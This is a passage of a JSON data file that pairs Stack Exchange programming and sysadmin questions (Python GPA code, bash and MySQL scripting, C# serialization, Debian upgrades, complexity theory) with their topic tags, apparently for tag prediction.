in {B-, b-}:    c7points = (2.67*cred7i)elif grade1 in {C+, c+}:    c7points = (2.33*cred7i)elif grade7 in {C, c}:    c7points = (2.0*cred7i)elif grade7 in {C-, c-}:    c7points = (1.67*cred7i)elif grade7 in {D+, d+}:    c7points = (1.33*cred7i)elif grade7 in {D, d}:    c7points = (1.0*cred7i)else:    c7points = 0.0totalCredits = cred1i+cred2i+cred3i+cred4i+cred5i+cred6i+cred7ioverallGPA = (c1points + c2points + c3points + c4points + c5points + c7points + c7points)/totalCreditscname1 = cname1.ljust(15)cred1 = cred1.center(9)grade1 = grade1.center(6)cname2 = cname2.ljust(15)cred2 = cred2.center(9)grade2 = grade2.center(6)cname3 = cname3.ljust(15)cred3 = cred3.center(9)grade3 = grade3.center(6)cname4 = cname4.ljust(15)cred4 = cred4.center(9)grade4 = grade4.center(6)cname5 = cname5.ljust(15)cred5 = cred5.center(9)grade5 = grade5.center(6)cname6 = cname6.ljust(15)cred6 = cred6.center(9)grade6 = grade6.center(6)cname7 = cname7.ljust(15)cred7 = cred1.center(9)grade7 = grade7.center(6)print COURSE         CREDITS  GRADE \\nprint ------         -------  ----- \\nprint '%s%s%s' % (cname1, cred1, grade1)print '%s%s%s' % (cname2, cred2, grade2)print '%s%s%s' % (cname3, cred3, grade3)print '%s%s%s' % (cname4, cred4, grade4)print '%s%s%s' % (cname5, cred5, grade5)print '%s%s%s' % (cname6, cred6, grade6)print '%s%s%s' % (cname7, cred7, grade7)print SEMESTER GPA = %.2f % (overallGPA)",
    "target": "python;python 2.7"
  },
  {
    "id": "_webapps.44567",
    "source": "How to Migrate Google Apps account to regular Google Account <eos> I currently have a free Google Apps for your Domain account, with only one email address in there. I will soon be moving from Google Mail to another hosted email solution (such as a hosted Exchange server).As a result of this, I want to remove the Google Apps part from my domain, but retain all of the other services I use, such as Analytics and Webmaster Tools. This would need to move to a Google Account, with the same name as my current Google Apps account.How can I do this?",
    "target": "google apps;google analytics;google account"
  },
  {
    "id": "_datascience.16485",
    "source": "Recommender System: how to treat different events <eos> I'm trying to build recommender based on user history from e-commerce. There are two(potentially more) types of events: purchase and view.Is it okay to sum up number of purchases and views for a given item(with purchase and view having different weights)? Or I`ll just mix up user intent this way? ",
    "target": "recommender system"
  },
  {
    "id": "_unix.154229",
    "source": "How to share internet connection over Ethernet using Network Manager? <eos> I have 2 computers, both with Gigabit controllers, connected with a regular Ethernet cable. I have a host machine, which is connected to the internet, and a client machine, which is only connected to the host machine. I would like to share the host's internet connection with the client machine. I have read online, and I found out the best way to do this is by opening Network Manager's GUI on my host machine, editing my Ethernet connection and setting the IPv4 settings to Shared to other computers. On my client machine, I have it set to automatically get an IP address using DHCP. My host machine does not detect the cable as being plugged in under these settings, and my client machine reports me it cannot connect to the network. How do I properly share my internet connection from the host machine to my client machine, preferably using Network Manager. ",
    "target": "networkmanager;internet"
  },
  {
    "id": "_softwareengineering.342772",
    "source": "What specific attributes make code able to be executed in parallel? <eos> List specific programming concepts that should code adhere to that it will run in parallel. For example, if a block of code does not change shared state, it should be able to be done on another thread. What other such attributes exist? I would imagine there only to be a small number of such concerns by which to evaluate whether code is a good candidate for parallelization, so what are they?  For example SQL Server when creating the execution plans much use these test to decide for each query section whether to run it in serial or allow it to run on another CPU. All I'm looking for is the list of theoretical rules, nothing implementation-specific.",
    "target": "parallel programming"
  },
  {
    "id": "_codereview.18862",
    "source": "Handling null exception when having multiple variables <eos> I have a lot of variables that I need to check for exceptions and output the empty field in case of a null returned value (I am reading a calender list from Sharepoint and my program is supposed to send email notifications if some of the conditions are met).I surrounded my variables with a try-catch with a generic output variable not found. Here is an example;try{var name = item[Name].ToString(); var dueDate= item[Due Date].ToString();..//more variables.   var Title= item[Title].ToString();    }catch (Exception ex)                        {                            Console.WriteLine();                            Console.WriteLine(ex.Message); //generic message for now                            Console.WriteLine();                        }Is there is a way to handle this better? I know that going to each individual line and adding an exception is an option but it would save me a lot of time if I can just output something like the variable name.",
    "target": "c#;object oriented;exception"
  },
  {
    "id": "_cs.67429",
    "source": "For data-path cycles in MIPS, what determines wheter a control signal gets the don't-care value? <eos> For example for the  sw command in MIPs, the control signal values areALUOp1: 0ALUOp: 0 RegWrite: 0 MemRead: x MemWrite: 1 Branch: 0 ALUsrc: 1 RegDest: x MemToReg: xWhy do memRead, RegDest and MemToReg have the values of x? Why not just 0? ",
    "target": "cpu pipelines"
  },
  {
    "id": "_unix.331059",
    "source": "How to create new MySQL database with encoding via BASH script <eos> I have one bash script for installing wordpress and want to add also mysql installer to easly can install database#!/bin/bashdr=$1db=$2zDir=latest.zipwpInstall=https://wordpress.org/$zDireval mkdir -p $dr && cd $dr && wget $wpInstall && unzip $zDir && cp -r $dr/wordpress/* $dr && sudo chmod -R 0777 $dr && sudo chmod -R 0777 $dr/* && rm -rf $dr/wordpress && rm -f -r $zDir && echo WordPress installatio$echo CREATE DATABASE IF NOT EXISTS `$db` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci | mysql -u root -phere I have one realy wierd problem:When I run script like this:$ ./install-wp.sh /var/www/test project_somethinginstaller install wordpress, place all files on the rigt place but when start part with mysql I get 2 errors.First is:> ./install-wp.sh: line 13: project_something: command not foundand second after mysql passowrd is entered:ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci' at line 1How to fix this?",
    "target": "shell script;mysql"
  },
  {
    "id": "_unix.204501",
    "source": "What are the 'n', 'l', '3pm' sections of the manual for? <eos> An excerpt from the man man page:The default action is to search in all  of  the  available sections following a pre-defined order (1 n l 8 3 2 3posix 3pm 3perl 5 4 9 6 7 by default)What are the n, l and 3pm sections of the manual for?",
    "target": "perl;man;posix;standard"
  },
  {
    "id": "_softwareengineering.194859",
    "source": "Security in Authentication in single page apps <eos> What's the most secure method of performing authentication in a single paged apps? I'm not talking about any specific client-side or server-side frameworks, but just general guidelines or best practices. All the communications are transfered primarily through sockJS.Also, OAuth is out of the question.",
    "target": "javascript;security;authentication"
  },
  {
    "id": "_unix.81614",
    "source": "backup script to exclude some parent dir and include some child dir <eos> What I'm trying to do backup?users home dir which include Desktop,Documents,Pictures, thunderbird which i need to backup of every userall users are in /home partition with there respective user namethere are certain user AND files in /home which need to be excludeWhat I've tried so far?$ tar cvf home01 -T include /home  NOTE: T which says only take that which are mention in file but does not work$ find . \\( -name \\*Desktop -o -name \\*Documents\\* -o -name \\*Pictures\\*  -o -name \\.thunderbird\\*   \\)  |  xargs  tar zcvf /opt/rnd/home-$(date +%d%m%y).tar.zip NOTE: which takes backup of mention dir but it puts every users dir into one folder.For example$ ls -l /home/home/user1/{Desktop,Documents,Pictures,.thunderbird}/home/user2/{Desktop,Documents,Pictures,.thunderbird}/home/user3/{Desktop,Documents,Pictures,.thunderbird}/home/user4/{Desktop,Documents,Pictures,.thunderbird}/home/user5/{Desktop,Documents,Pictures,.thunderbird}From which I need to take only user1,user2,user3 home dir backup and exclude user4,user5",
    "target": "backup"
  },
  {
    "id": "_unix.163237",
    "source": "How to delete specific characters in a text file <eos> I have the following lines in a text file:1 Q0 /home/nikol123/Downloads/Ergasia_1/Ergasia_1/metadata/13/120411.xml 1 1 Q0 /home/nikol123/Downloads/Ergasia_1/Ergasia_1/metadata/11/105016.xml 2 1 Q0 /home/nikol123/Downloads/Ergasia_1/Ergasia_1/metadata/15/149972.xml 3 1 Q0 /home/nikol123/Downloads/Ergasia_1/Ergasia_1/metadata/12/110688.xml 4 and I want to keep only these data:1 Q0 120411 1 1 Q0 105016 2 1 Q0 149972 3 1 Q0 110688 4 namely to keep from each line from the path /home/nikol123/Downloads/Ergasia_1/Ergasia_1/metadata/13/120411.xml for example only the number 120411 and so on...",
    "target": "shell script;text processing"
  },
  {
    "id": "_cs.79638",
    "source": "What would sum types with functions look like in OOP? <eos> It's fair to summarize classes in OOP as product types with functions. However, couldn't there be something like sum types with functions? How would inheritance work with them?I'm trying to scout if anybody has considered this question before in language design.",
    "target": "programming languages;type theory;object oriented"
  },
  {
    "id": "_unix.88838",
    "source": "Preserve tcsh history in multiple terminal windows <eos> How can we preserve or maintain the same history across multiple terminals?The same question, but for bash shell , were discussed in the below linkPreserve bash history in multiple terminal windowslet me know the corresponding settings for tcsh shell ?",
    "target": "command history;tcsh"
  },
  {
    "id": "_softwareengineering.38368",
    "source": "what kind of online technical documentation system would you recommend? <eos> the goal is to have an online documentation system, with these major requirements:will be mainly used as an intermediate stage for the final technical docs of all our application (which will probably never get completed though :]). It would be typically used as so: someone has a problem, I fix it, and write down the fix immedeately. What happens now is getting unmanagable: someone has a problem, I fix it, both me and someone are happy but 2 months later somebody else has the same problem and nobody remembers what the fix was.accessible from everywhere, running behind our apache serveruser/group managment, allowing read-only/read-write/admin accessthe format is not too important: plain text would do, wiki-style would be nicer thoughcheap or freesome ideas of mine:just serve files on a file share or through ssh (cons: not too copmatible with windows, pros: simple, can be any file type)keep it in an SCM (svn/git, idem as above but easier to access and control access)Confluence: we use Jira already, is Confluence worth it? How does it integrate with Jira?something else?Please don't hesitate commenting on these or share your experience with other systems.",
    "target": "documentation"
  },
  {
    "id": "_softwareengineering.216915",
    "source": "How to deal with requirement changes in agile development model? <eos> I know that in agile requirement changes should not only be planned for but also embraced. But I still don't know agile how to handle these changes. ",
    "target": "agile"
  },
  {
    "id": "_webapps.88917",
    "source": "Two pages on Google+ <eos> How can I add second page in Google Plus? I have personal Google+ account and my company page, but I want to create next page about my hobby. How can I do this?",
    "target": "google plus;google plus pages"
  },
  {
    "id": "_softwareengineering.60684",
    "source": "Familiarizing with the Zend Framework in one week <eos> You are conversant with the ZF?How would you go about getting familiar with it in one week?What would be your suggested schedule?",
    "target": "learning;php;zend framework"
  },
  {
    "id": "_cs.62824",
    "source": "Is NP-complete complexity defined in terms of polynomial reductions or polynomial transformations? <eos> How do you know that a decision problem $X$ is NP-complete?, if all other NP-problems polynomially transform to $X$ or if all other NP-problems polynomially reduces (there exist a polynomial time oracle for any problem in NP using an oracle for $X$).Definitions seem to differ all over the web.Thanks!",
    "target": "complexity theory;np complete;reductions;np;oracle machines"
  },
  {
    "id": "_codereview.139954",
    "source": "Serializing Objects to Delimited Files Part II <eos> This is a follow up to my previous question: Serializing objects to delimited filesI've added some feature enhancements, and based on suggestions from rolfl in chat, I've fixed up a couple inconsistencies with the serializer.First, if you don't mark any properties with DelimitedColumnAttribute, I added a DelimitedIgnoreAttribute which will blacklist columns instead. For objects with no properties marked with either, all properties are serialized instead, with the following exception:No collection properties (except System.String) are serialized, period.You can also replace invalid values in names/fields (values that have the RowDelimiter or ColumnDelimiter in them) with whatever you specify.You can choose whether or not to include the header row.You can choose to quote values/names. If you choose to, all values/names are quoted.You can choose how double-quotes are escaped (necessary for quoted values/names).DelimitedSerializer.cs:/// <summary>/// Represents a serializer that will serialize arbitrary objects to files with specific row and column separators./// </summary>public class DelimitedSerializer{    /// <summary>    /// The string to be used to separate columns.    /// </summary>    public string ColumnDelimiter { get; set; }    /// <summary>    /// The string to be used to separate rows.    /// </summary>    public string RowDelimiter { get; set; }    /// <summary>    /// If not null, then sequences in values and names which are identical to the <see cref=ColumnDelimiter/> will be replaced with this value.    /// </summary>    public string InvalidColumnReplace { get; set; }    /// <summary>    /// If not null, then sequences in values and names which are identical to the <see cref=RowDelimiter/> will be replaced with this value.    /// </summary>    public string InvalidRowReplace { get; set; }    /// <summary>    /// If true, a trailing <see cref=ColumnDelimiter/> will be included on each line. (Some legacy systems require this.)    /// </summary>    public bool IncludeTrailingDelimiter { get; set; }    /// <summary>    /// If true, an empty row will be included at the end of the response. (Some legacy systems require this.)    /// </summary>    public bool IncludeEmptyRow { get; set; }    /// <summary>    /// If true, then all values and columns will be quoted in double-quotes.    /// </summary>    public bool QuoteValues { get; set; }    /// <summary>    /// If not null, then double quotes appearing inside a value will be escaped with this value.    /// </summary>    public string DoubleQuoteEscape { get; set; }    /// <summary>    /// If true, then a header row will be output.    /// </summary>    public bool IncludeHeader { get; set; }    /// <summary>    /// Serializes an object to a delimited file. Throws an exception if any of the property names, column names, or values contain either the <see cref=ColumnDelimiter/> or the <see cref=RowDelimiter/>.    /// </summary>    /// <typeparam name=T>The type of the object to serialize.</typeparam>    /// <param name=items>A list of the items to serialize.</param>    /// <returns>The serialized string.</returns>    public string Serialize<T>(List<T> items)    {        if (string.IsNullOrEmpty(ColumnDelimiter))        {            throw new ArgumentException($The property '{nameof(ColumnDelimiter)}' cannot be null or an empty string.);        }        if (string.IsNullOrEmpty(RowDelimiter))        {            throw new ArgumentException($The property '{nameof(RowDelimiter)}' cannot be null or an empty string.);        }        var result = new ExtendedStringBuilder();        var properties = typeof(T).GetProperties()            .Select(p => new            {                Attribute = p.GetCustomAttribute<DelimitedColumnAttribute>(),                Info = p            })            .Where(x => x.Attribute != null)            .OrderBy(x => x.Attribute.Order)            .ThenBy(x => x.Attribute.Name)            .ThenBy(x => x.Info.Name)            .ToList();        if (properties.Count == 0)        {            properties = typeof(T).GetProperties()                .Where(x => x.GetCustomAttribute<DelimitedIgnoreAttribute>() == null)                .Select(p => new                {                    Attribute = new DelimitedColumnAttribute { Name = p.Name },                    Info = p                })                .Where(x => x.Attribute != null)                .OrderBy(x => x.Attribute.Order)                .ThenBy(x => x.Attribute.Name)                .ThenBy(x => x.Info.Name)                .ToList();        }        Action<string, string, string> validateCharacters = (string name, string checkFor, string humanLocation) =>        {            if (name.Contains(checkFor))            {                throw new ArgumentException($The {humanLocation} string '{name}' contains an invalid character: '{checkFor}'.);            }        };        var columnLine = new ExtendedStringBuilder();        foreach (var property in properties)        {            if (property.Info.PropertyType.IsArray || (property.Info.PropertyType != typeof(string) && property.Info.PropertyType.GetInterface(typeof(IEnumerable<>).FullName) != null))            {                continue;            }            var name = property.Attribute?.Name ?? property.Info.Name;            if (InvalidColumnReplace != null)            {                name = name.Replace(ColumnDelimiter, InvalidColumnReplace);            }            if (InvalidRowReplace != null)            {                name = name.Replace(RowDelimiter, InvalidRowReplace);            }            if (DoubleQuoteEscape != null)            {                name = name.Replace(\\, DoubleQuoteEscape);            }            validateCharacters(name, ColumnDelimiter, column name);            validateCharacters(name, RowDelimiter, column name);            if (columnLine.HasBeenAppended)            {                columnLine += ColumnDelimiter;            }            if (QuoteValues)            {                columnLine += \\;            }            columnLine += name;            if (QuoteValues)            {                columnLine += \\;            }        }        if (IncludeTrailingDelimiter)        {            columnLine += ColumnDelimiter;        }        if (IncludeHeader)        {            result += columnLine;        }        foreach (var item in items)        {            var row = new ExtendedStringBuilder();            foreach (var property in properties)            {                if (property.Info.PropertyType.IsArray || (property.Info.PropertyType != typeof(string) && property.Info.PropertyType.GetInterface(typeof(IEnumerable<>).FullName) != null))                {                    continue;                }                var value = property.Info.GetValue(item)?.ToString();                if (property.Info.PropertyType == typeof(DateTime) || property.Info.PropertyType == typeof(DateTime?))                {                    value = ((DateTime?)property.Info.GetValue(item))?.ToString(u);                }                if (value != null)                {                    if (InvalidColumnReplace != null)                    {                        value = value.Replace(ColumnDelimiter, InvalidColumnReplace);                    }                    if (InvalidRowReplace != null)                    {                        value = value.Replace(RowDelimiter, InvalidRowReplace);                    }                    if (DoubleQuoteEscape != null)                    {                        value = value.Replace(\\, DoubleQuoteEscape);                    }                    validateCharacters(value, ColumnDelimiter, property value);                    validateCharacters(value, RowDelimiter, property value);                }                if (row.HasBeenAppended)                {                    row += ColumnDelimiter;                }                if (QuoteValues)                {                    row += \\;                }                row += value;                if (QuoteValues)                {                    row += \\;                }            }            if (IncludeTrailingDelimiter)            {                row += ColumnDelimiter;            }            if (result.HasBeenAppended)            {                result += RowDelimiter;            }            result += row;        }        return result;    }    /// <summary>    /// Returns an instance of the <see cref=DelimitedSerializer/> setup for Tab-Separated Value files.    /// </summary>    public static DelimitedSerializer TsvSerializer => new DelimitedSerializer    {        ColumnDelimiter = \\t,        RowDelimiter = \\r\\n,        InvalidColumnReplace = \\\\t,        IncludeHeader = true    };    /// <summary>    /// Returns an instance of the <see cref=DelimitedSerializer/> setup for Comma-Separated Value files.    /// </summary>    public static DelimitedSerializer CsvSerializer => new DelimitedSerializer    {        ColumnDelimiter = ,,        RowDelimiter = \\r\\n,        InvalidColumnReplace = \\\\u002C,        IncludeHeader = true    };    /// <summary>    /// Returns an instance of the <see cref=DelimitedSerializer/> setup for Pipe-Separated Value files.    /// </summary>    public static DelimitedSerializer PsvSerializer => new DelimitedSerializer    {        ColumnDelimiter = |,        RowDelimiter = \\r\\n,        InvalidColumnReplace = \\\\u007C,        IncludeHeader = true    };    /// <summary>    /// Returns an instance of the <see cref=DelimitedSerializer/> from the RFC 4180 specification. See: https://tools.ietf.org/html/rfc4180    /// </summary>    public static DelimitedSerializer Rfc4180Serializer => new DelimitedSerializer    {        ColumnDelimiter = ,,        RowDelimiter = \\r\\n,        IncludeHeader = true,        IncludeTrailingDelimiter = true,        QuoteValues = true,        DoubleQuoteEscape = \\\\    };}DelimitedColumnAttribute.cs:/// <summary>/// Represents a column which can be used in a <see cref=DelimitedSerializer/>./// </summary>[AttributeUsage(AttributeTargets.Property)]public class DelimitedColumnAttribute : Attribute{    /// <summary>    /// The name of the column.    /// </summary>    public string Name { get; set; }    /// <summary>    /// The order the column should appear in.    /// </summary>    public int Order { get; set; }}DelimitedIgnoreAttribute.cs:[AttributeUsage(AttributeTargets.Property)]public class DelimitedIgnoreAttribute : Attribute{}",
    "target": "c#;.net;serialization;reflection"
  },
  {
    "id": "_softwareengineering.71825",
    "source": "Does current evidence support the adoption of Contextual over Canonical Data Models? <eos> The canonical idea is pervasive in software; patterns like Canonical Model, Canonical Schema, Canonical Data Model and so on, seem to come up again and again in development.Like many developers, I've often followed, uncritically, the conventional wisdom that you need a canonical model, otherwise you'll face a combinatorial explosion of mappers and translators.  Or at least, I used to do that until a couple of years ago when I first read the somewhat-infamous EF Vote of No Confidence:The hypotheses that once supported the pursuit of canonical data models didnt and couldnt include factors that would be discovered once the idea was put into practice. We have found, through years of trial and error, that using separate models for each individual context in which a canonical data model might be used is the least complex approach, is the least costly approach, and the one that leads to greater maintainability and extensibility of the applications and endpoints using contextual models, and its an approach that doesnt encourage the software entropy that canonical models do.The essay presents no evidence of any kind to support its claims, but did make me question the CDM approach long enough to try the alternative, and the resulting software didn't explode, literally or figuratively.  But that doesn't mean a whole lot in isolation; I could have just been lucky.So I'm wondering, has any serious research been done into the practical, long-term effects of having a canonical model vs. contextual models in a software system or architecture?Or, if it's too early to be asking that, then have any developers/architects written about personal experiences switching from a CDM to independent contextual models, or vice versa, and what the practical effects were on things like productivity, complexity, or reliability?What about the differences at different levels, i.e. using the same model across a single application vs. using it across a system of applications or an entire enterprise?(Facts only, please; war stories are welcome but no speculation.)",
    "target": "design patterns;architecture;data;domain model"
  },
  {
    "id": "_unix.97940",
    "source": "How do I filter a log to only the lines between two times? <eos> I'm working in Unix.I'd like to fetch information from a log in a specified time range for the current date. For example I want the data from a log file of today's date from 00:00 to 09:00. Sample log entry:13/10/16 14:45:02 <batchspeedchange> <BELLBD.BD77350A.G6987V00> <> FAILED FILE FORMAT VALIDATION - ERROR:-213:rawData cannot contain tokensHow do I get the output from such a log file?",
    "target": "bash"
  },
  {
    "id": "_unix.195728",
    "source": "Why am I getting invalid max count from grep in an alias? <eos> So the idea is to create an alias that will search my alias's for me. I have quite a few. dude@gnarleybox:~$ grep alg .bash_aliases.shalias alg='alias | grep 'dude@gnarleybox:~$ alias | grep algalias alg='alias | grep 'dude@gnarleybox:~$ alg gdgrep: invalid max countdude@gnarleybox:~$ Huh? Like grep is getting two many parameters? How is that possible? Note that I've also tried it without the space on the end:alias alg='alias | grep' You should just be able to type: alg gd ...and get the alias I use to fuse mount GoogleDocs. ",
    "target": "bash;grep;alias"
  },
  {
    "id": "_cs.14954",
    "source": "Division by a constant <eos> After skimming Multiplication by a Constant is Sublinear (PDF), (slides (PDF), slides with notes (PDF)) I was wondering if this could be extended to division by a constant in sublinear time?Additionally, what about division with a constant numerator, ie. division of a constant?",
    "target": "algorithms;reference request;integers"
  },
  {
    "id": "_unix.349347",
    "source": "I can't upgrade Debian 9 <eos> I execute: sudo apt-get dist-upgrade and I get this:Reading Package Lists ... DoneBuilding the dependency treeReading status information ... DoneCalculation of the update ... Some packages can not be installed. This may meanThat you have asked for the impossible, or if youUnstable distribution, which some packages have not yetHave been created or have not been released from Incoming.The following information should help you resolve the situation:The following packages contain unsatisfied dependencies: Systemd: Break: rdnssd (<1.0.1-5) but 1.0.1-1 + b1 must be installedE: Error, pkgProblem :: Resolve generated breaks, which could be caused by the packages to be kept as is.OUTPUT apt-cache policy rdnssd   Dmicaelandre @ ThinkPad: ~ $ apt-cache policy rdnssdrdnssd: Installed: 1.0.1-1+b1 Candidate: 1.0.3-3 Version table: 1.0.3-3 0 650 http://ftp2.fr.debian.org/debian/ stretch/main amd64 Packages *** 1.0.1-1+b1 0 100 /var/lib/dpkg/statusOUTPUT apt-cache policy100 /var/lib/dpkg/status     release a=now 500 http://security.debian.org/ stretch/updates/non-free Translation-en 500 http://security.debian.org/ stretch/updates/main Translation-en 500 http://security.debian.org/ stretch/updates/contrib Translation-en 650 http://security.debian.org/ stretch/updates/non-free i386 Packages     release o=Debian,a=testing,n=stretch,l=Debian-Security,c=non-free     origin security.debian.org 650 http://security.debian.org/ stretch/updates/contrib i386 Packages     release o=Debian,a=testing,n=stretch,l=Debian-Security,c=contrib     origin security.debian.org 650 http://security.debian.org/ stretch/updates/main i386 Packages     release o=Debian,a=testing,n=stretch,l=Debian-Security,c=main     origin security.debian.org 650 http://security.debian.org/ stretch/updates/non-free amd64 Packages     release o=Debian,a=testing,n=stretch,l=Debian-Security,c=non-free     origin security.debian.org 650 http://security.debian.org/ stretch/updates/contrib amd64 Packages     release o=Debian,a=testing,n=stretch,l=Debian-Security,c=contrib     origin security.debian.org 650 http://security.debian.org/ stretch/updates/main amd64 Packages     release o=Debian,a=testing,n=stretch,l=Debian-Security,c=main     origin security.debian.org 500 http://ftp2.fr.debian.org/debian/ stretch-updates/non-free Translation-en 500 http://ftp2.fr.debian.org/debian/ stretch-updates/main Translation-en 500 http://ftp2.fr.debian.org/debian/ stretch-updates/contrib Translation-en 500 http://ftp2.fr.debian.org/debian/ stretch-updates/non-free i386 Packages     release o=Debian,a=testing-updates,n=stretch-updates,l=Debian,c=non-free     origin ftp2.fr.debian.org 500 http://ftp2.fr.debian.org/debian/ stretch-updates/contrib i386 Packages     release o=Debian,a=testing-updates,n=stretch-updates,l=Debian,c=contrib     origin ftp2.fr.debian.org 500 http://ftp2.fr.debian.org/debian/ stretch-updates/main i386 Packages     release o=Debian,a=testing-updates,n=stretch-updates,l=Debian,c=main     origin ftp2.fr.debian.org 500 http://ftp2.fr.debian.org/debian/ stretch-updates/non-free amd64 Packages     release o=Debian,a=testing-updates,n=stretch-updates,l=Debian,c=non-free     origin ftp2.fr.debian.org 500 http://ftp2.fr.debian.org/debian/ stretch-updates/contrib amd64 Packages     release o=Debian,a=testing-updates,n=stretch-updates,l=Debian,c=contrib     origin ftp2.fr.debian.org 500 http://ftp2.fr.debian.org/debian/ stretch-updates/main amd64 Packages     release o=Debian,a=testing-updates,n=stretch-updates,l=Debian,c=main     origin ftp2.fr.debian.org 500 http://ftp2.fr.debian.org/debian/ stretch/non-free Translation-en 500 http://ftp2.fr.debian.org/debian/ stretch/main Translation-fr 500 http://ftp2.fr.debian.org/debian/ stretch/main Translation-en 500 http://ftp2.fr.debian.org/debian/ stretch/contrib Translation-en 650 http://ftp2.fr.debian.org/debian/ stretch/non-free i386 Packages     release o=Debian,a=testing,n=stretch,l=Debian,c=non-free     origin ftp2.fr.debian.org 650 http://ftp2.fr.debian.org/debian/ stretch/contrib i386 Packages     release o=Debian,a=testing,n=stretch,l=Debian,c=contrib     origin ftp2.fr.debian.org 650 http://ftp2.fr.debian.org/debian/ stretch/main i386 Packages     release o=Debian,a=testing,n=stretch,l=Debian,c=main     origin ftp2.fr.debian.org 650 http://ftp2.fr.debian.org/debian/ stretch/non-free amd64 Packages     release o=Debian,a=testing,n=stretch,l=Debian,c=non-free     origin ftp2.fr.debian.org 650 http://ftp2.fr.debian.org/debian/ stretch/contrib amd64 Packages     release o=Debian,a=testing,n=stretch,l=Debian,c=contrib     origin ftp2.fr.debian.org 650 http://ftp2.fr.debian.org/debian/ stretch/main amd64 Packages     release o=Debian,a=testing,n=stretch,l=Debian,c=main     origin ftp2.fr.debian.org",
    "target": "debian;upgrade"
  },
  {
    "id": "_unix.293284",
    "source": "Learn the base of security and defend myself from external attack <eos> i would like to learn and work on internet security, because thia is a world that is in continuos change and id like to improve myself on it..anyone can help me linking site or PDF where i can study this fantastic world?",
    "target": "linux;networking;security;osx;windows"
  },
  {
    "id": "_webmaster.38778",
    "source": "core.* files eating up server space (~50MB) <eos> I'm renting server space from someone and, upon logging in my control panel after quite sometime, noticed an abnormal spike (~50MB) in the disk usage. Upon investigating, I found a lot of core.* files scattered around my public_html directory. Each one is more than 5MB in size but no more than 6MB. The * part is all numbers (in programming regex, that should be core\\.\\d+).I downloaded one and checked the contents. There was a lot of balderdash characters (NUL mostly, but also a scattering of ETB, ETX, STX) but there's this block of readable text which says:This text is part of the internal format of your mail folder, and is nota real message.  It is created automatically by the mail system software.If deleted, important folder data will be lost, and it will be re-createdwith the data reset to initial values.Pretty self-explanatory. A few blocks above the text are some more readable messages that look like logs but is sandwiched in between non printable characters. I've extracted some below.Scan not valid for mh mailboxesBogus character 0x%x in news stateCan't rewrite news state %.80sError closing backup news state %.80sNo state for newsgroup %.80s foundNow, a few concerns: Am I under attack? The messages seem to be about my webmail but I don't use my personal webmail that much---only for a vanity email address and an inbox for an outdated comments system. However, lately, I seem to notice a spike in the spam for my vanity mail. (Note: the comments system is covered by a captcha but every now and then some get through. My vanity email has a spam filter but it isn't as good as I'd like).Next, if this is a feature, can I turn it off? Is it advisable to? I've only 150MB so you see why I'm fretting over a 50MB spike.Some final details: my only server-side scripts are in PHP. The directory which accumulated the most number of these core files is the one containing the Wordpress-managed subdomain of my site. I manage my server through CPanel. Lastly, I decided to delete this files and after some checking nothing seems amiss in my websites nor in my mail. They are indeed the ones responsible for the ~50MB spike as my disk space usage is back to expected.",
    "target": "php;cpanel;mailing list;webmail"
  },
  {
    "id": "_webapps.73196",
    "source": "How to add adjacent cells in Google Sheets <eos> I am looking for a way to add up cells under a name. For instance, I am trying to tally all of the assists the character Annie got in a few different games of League of Legends. I am looking for a way to search for a name (which shows up multiple times) and then count adjacent cells.",
    "target": "google spreadsheets"
  },
  {
    "id": "_datascience.1053",
    "source": "Summarize and visualize a CSV in Java/Scala? <eos> I would like to summarize (as in R) the contents of a CSV (possibly after loading it, or storing it somewhere, that's not a problem). The summary should contain the quartiles, mean, median, min and max of the data in a CSV file for each numeric (integer or real numbers) dimension. The standard deviation would be cool as well.I would also like to generate some plots to visualize the data, for example 3 plots for the 3 pairs of variables that are more correlated (correlation coefficient) and 3 plots for the 3 pairs of variables that are least correlated.R requires only a few lines to implement this. Are there any libraries (or tools) that would allow a similarly simple (and efficient if possible) implementation in Java or Scala?PD: This is a specific use case for a previous (too broad) question.",
    "target": "tools;visualization;scala;csv"
  },
  {
    "id": "_cs.68549",
    "source": "NFA automata with  moves proof <eos> let's say L is a regular language.And there in an NFA automata with epsilon moves A,in which for every accepting state (q,)=.How can I prove that there must be an automata A as defined for L?",
    "target": "automata;finite automata;proof techniques"
  },
  {
    "id": "_unix.381739",
    "source": "What is the practical difference between `systemctl start reboot.target` and `systemctl reboot`? <eos> There are two documented differences between start reboot.target and reboot.  But start reboot.target is what is triggered by ctrl-alt-del.target.Does it matter that ctrl-alt-del.target will omit --job-mode=replace-irreversibly?  In what situations will this cause different behaviour?   Why is it included by systemctl reboot?man systemctlreboot [arg]Shut down and reboot the system. This is mostly equivalent to start reboot.target --job-mode=replace-irreversibly, but also prints a             wall message to all users.man systemd.specialctrl-alt-del.target:             systemd starts this target whenever Control+Alt+Del is pressed on the console. Usually, this should be aliased (symlinked) to             reboot.target.",
    "target": "systemd;reboot"
  },
  {
    "id": "_unix.64848",
    "source": "cannot touch -m a writable file <eos> Can someone explain why I get permission denied when running touch -m on this file even though it is group writable and I can write to the file fine.~/test1-> iduid=1000(plyons) gid=1000(plyons) groups=1000(plyons),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin),1002(webadmin)~/test1-> ls -ld .; ls -ldrwxrwxr-x 2 plyons plyons 4096 Feb 14 21:20 .total 4-r--rw---- 1 www-data webadmin 24 Feb 14 21:29 foo~/test1-> echo the file is writable >> foo~/test1-> touch -m footouch: setting times of `foo': Operation not permitted~/test1-> lsattr foo -------------e- foo~/test1-> newgrp - webadmin ~/test1-> iduid=1000(plyons) gid=1002(webadmin) groups=1000(plyons),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin),1002(webadmin)~/test1-> touch -m footouch: setting times of `foo': Operation not permitted~/test1-> echo the file is writable >> foo~/test1-> ",
    "target": "filesystems;permissions"
  },
  {
    "id": "_codereview.163043",
